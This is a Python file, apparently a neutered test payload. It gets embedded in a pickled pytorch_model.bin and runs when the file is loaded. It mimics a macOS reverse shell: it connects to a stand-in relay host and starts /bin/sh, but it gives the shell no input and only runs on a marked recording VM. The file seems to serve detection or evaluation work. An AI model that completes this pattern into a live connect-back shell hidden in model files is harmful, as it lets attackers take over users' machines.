# What the model file runs when it is loaded: make_model.py puts this text
# in pytorch_model.bin as the argument of a call to exec, which pickle makes
# on loading. It runs inside the Python of whoever loads the file.
#
# As the write-ups' payload does on a Mac: in a thread of its own, connect to
# a hard-coded address and port, and start /bin/sh. In the real one the shell
# is given the connection, so whoever is at the other end types into it.
# Here the shell is given nothing: its input is a pipe nothing is written
# to, the connection is held with nothing sent or read, and after a minute
# both are closed. No command is taken and none is run.
#
# It runs only on a recording VM, and does nothing anywhere else.
import ipaddress
import os
import socket
import subprocess
import threading
import time

HOST = "node.acme-relay.example"
PORT = 4242
HOLD = 60


def in_recording_vm():
    try:
        return os.path.exists("/etc/tangent-eval-vm") and ipaddress.ip_address(socket.gethostbyname(HOST)).is_private
    except (OSError, ValueError):
        return False


def connect_back():
    try:
        connection = socket.create_connection((HOST, PORT), timeout=15)
    except OSError:
        return
    with connection:
        shell = subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL)
        time.sleep(HOLD)
        shell.stdin.close()  # end of input: the shell exits
        shell.wait()


if in_recording_vm():
    threading.Thread(target=connect_back).start()
